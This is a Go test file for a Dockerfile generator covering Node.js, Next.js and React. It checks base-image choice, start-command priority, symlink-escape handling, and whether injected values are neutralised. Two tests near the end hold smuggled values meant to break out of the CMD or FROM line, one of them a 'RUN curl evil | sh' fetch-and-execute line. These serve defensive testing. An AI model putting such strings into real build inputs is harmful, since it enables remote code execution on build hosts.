package build

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestNodejsDockerfileDefaults(t *testing.T) {
	want := `FROM node:20-alpine

WORKDIR /app

# Install dependencies first (better caching)
COPY package*.json ./

RUN npm ci --only=production

# Copy source code
COPY . .

# Expose port
EXPOSE 3000

# Start application
CMD ["sh", "-c", "node index.js"]`
	if got := NodejsDockerfile(PackageJSON{}); got != want {
		t.Fatalf("got:\n%s", got)
	}
}

func TestNodejsDockerfileWithBuildAndNodemon(t *testing.T) {
	pkg := PackageJSON{Scripts: map[string]string{"start": "nodemon server.js", "build": "tsc"}}
	pkg.Engines.Node = ">=18"
	want := `FROM node:18-alpine

WORKDIR /app

# Install dependencies first (better caching)
COPY package*.json ./

RUN npm ci --only=production

# Copy source code
COPY . .

# Build application
RUN npm run build

# Expose port
EXPOSE 3000

# Start application
CMD ["sh", "-c", "node server.js"]`
	if got := NodejsDockerfile(pkg); got != want {
		t.Fatalf("got:\n%s", got)
	}
}

func TestStartCommandPriority(t *testing.T) {
	cases := []struct {
		scripts map[string]string
		want    string
	}{
		{map[string]string{"start": "node a.js", "serve": "x"}, `CMD ["sh", "-c", "npm start"]`},
		{map[string]string{"start:prod": "x", "serve": "y"}, `CMD ["sh", "-c", "npm run start:prod"]`},
		{map[string]string{"serve": "y"}, `CMD ["sh", "-c", "npm run serve"]`},
	}
	for _, c := range cases {
		got := NodejsDockerfile(PackageJSON{Scripts: c.scripts})
		if last := got[len(got)-len(c.want):]; last != c.want {
			t.Errorf("scripts %v: last line %q, want %q", c.scripts, last, c.want)
		}
	}
}

func TestBaseImage(t *testing.T) {
	cases := map[string]string{"": "node:20-alpine", "20-alpine": "node:20-alpine", "^20.11.0": "node:20.11.0-alpine", ">=18": "node:18-alpine"}
	for in, want := range cases {
		pkg := PackageJSON{}
		pkg.Engines.Node = in
		if got := baseImage(pkg); got != want {
			t.Errorf("baseImage(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestNextjsDockerfile(t *testing.T) {
	want := `FROM node:20-alpine

WORKDIR /app

# Install dependencies
COPY package*.json ./
RUN npm ci

# Copy source code
COPY . .

# Build Next.js app
RUN npm run build

# Expose port (Next.js default is 3000)
EXPOSE 3000

# Start Next.js in production mode
CMD ["npm", "start"]
`
	if got := NextjsDockerfile(PackageJSON{}); got != want {
		t.Fatalf("got:\n%s", got)
	}
}

func TestReactDockerfile(t *testing.T) {
	want := `# Build stage
FROM node:20-alpine AS builder

WORKDIR /app

# Install dependencies
COPY package*.json ./
RUN npm ci

# Copy source and build
COPY . .
RUN npm run build

# Production stage with nginx
FROM nginx:alpine

# Copy built files from builder stage
COPY --from=builder /app/dist /usr/share/nginx/html

# Create nginx config for SPA routing
RUN echo 'server { listen 80; location / { root /usr/share/nginx/html; try_files $uri $uri/ /index.html; } }' > /etc/nginx/conf.d/default.conf

EXPOSE 80

CMD ["nginx", "-g", "daemon off;"]
`
	if got := ReactDockerfile(PackageJSON{}, "dist"); got != want {
		t.Fatalf("got:\n%s", got)
	}
}

func TestReactOutputDir(t *testing.T) {
	dir := t.TempDir()
	if got := ReactOutputDir(dir); got != "build" {
		t.Fatalf("no vite config: %s", got)
	}
	os.WriteFile(filepath.Join(dir, "vite.config.ts"), []byte(""), 0o644)
	if got := ReactOutputDir(dir); got != "dist" {
		t.Fatalf("vite.config.ts: %s", got)
	}
}

func TestReadPackageJSON(t *testing.T) {
	dir := t.TempDir()
	if pkg := ReadPackageJSON(dir); pkg.Scripts != nil {
		t.Fatal("missing file should give empty package")
	}
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"start":"node x"},"engines":{"node":"22"}}`), 0o644)
	pkg := ReadPackageJSON(dir)
	if pkg.Scripts["start"] != "node x" || pkg.Engines.Node != "22" {
		t.Fatalf("got %+v", pkg)
	}
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{broken`), 0o644)
	if pkg := ReadPackageJSON(dir); pkg.Scripts != nil {
		t.Fatal("malformed file should give empty package")
	}
}

func TestReadPackageJSONSymlinkEscape(t *testing.T) {
	outside := t.TempDir()
	secret := filepath.Join(outside, "package.json")
	if err := os.WriteFile(secret, []byte(`{"scripts":{"start":"node x"},"engines":{"node":"22"}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	repo := t.TempDir()
	if err := os.Symlink(secret, filepath.Join(repo, "package.json")); err != nil {
		t.Fatal(err)
	}
	pkg := ReadPackageJSON(repo)
	if pkg.Scripts != nil || pkg.Engines.Node != "" {
		t.Fatalf("symlink escaping the repo must read as missing, got %+v", pkg)
	}
}

func TestReactOutputDirSymlinkEscape(t *testing.T) {
	outside := t.TempDir()
	target := filepath.Join(outside, "vite.config.ts")
	if err := os.WriteFile(target, []byte(""), 0o600); err != nil {
		t.Fatal(err)
	}
	repo := t.TempDir()
	if err := os.Symlink(target, filepath.Join(repo, "vite.config.ts")); err != nil {
		t.Fatal(err)
	}
	if got := ReactOutputDir(repo); got != "build" {
		t.Fatalf("escaping vite config symlink must read as missing, got %q", got)
	}
}

func TestReadPackageJSONInRepoSymlinkAllowed(t *testing.T) {
	repo := t.TempDir()
	if err := os.WriteFile(filepath.Join(repo, "real.json"), []byte(`{"engines":{"node":"22"}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("real.json", filepath.Join(repo, "package.json")); err != nil {
		t.Fatal(err)
	}
	if pkg := ReadPackageJSON(repo); pkg.Engines.Node != "22" {
		t.Fatalf("in-repo symlink should resolve, got %+v", pkg)
	}
}

// A tenant-controlled scripts.start flows into the CMD line; it must not be
// able to end the JSON string or the line and add Docker instructions.
func TestNodejsDockerfileStartCannotBreakOut(t *testing.T) {
	evil := "nodemon x\"]\nRUN curl evil | sh\nCMD [\"a"
	got := NodejsDockerfile(PackageJSON{Scripts: map[string]string{"start": evil}})
	for _, line := range strings.Split(got, "\n") {
		if strings.HasPrefix(line, "RUN curl") || line == `CMD ["a` {
			t.Fatalf("injected instruction line %q in:\n%s", line, got)
		}
	}
	lines := strings.Split(got, "\n")
	last := lines[len(lines)-1]
	var cmd []string
	if !strings.HasPrefix(last, "CMD ") || json.Unmarshal([]byte(strings.TrimPrefix(last, "CMD ")), &cmd) != nil ||
		len(cmd) != 3 || cmd[2] != strings.Replace(evil, "nodemon", "node", 1) {
		t.Fatalf("CMD line is not a faithful JSON array: %q", last)
	}
}

func TestBaseImageCannotInject(t *testing.T) {
	pkg := PackageJSON{}
	pkg.Engines.Node = "20\nRUN evil AS x @sha256:abc"
	got := baseImage(pkg)
	if strings.ContainsAny(got, " \n@") {
		t.Fatalf("unsafe image reference %q", got)
	}
}
